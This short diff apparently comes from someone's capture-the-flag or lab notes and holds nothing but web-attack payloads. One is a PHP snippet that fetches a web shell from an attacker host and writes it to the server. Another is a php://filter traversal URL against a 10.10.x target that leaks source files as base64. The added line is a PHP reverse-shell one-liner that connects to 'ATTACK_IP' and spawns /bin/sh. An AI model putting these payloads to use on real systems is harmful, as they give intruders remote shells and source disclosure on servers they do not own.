@@ -9,3 +9,6 @@
 
 <?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?>
 http://10.10.208.6/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
+
+# php rev_shell oneliner
+php -r '$sock=fsockopen("ATTACK_IP",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
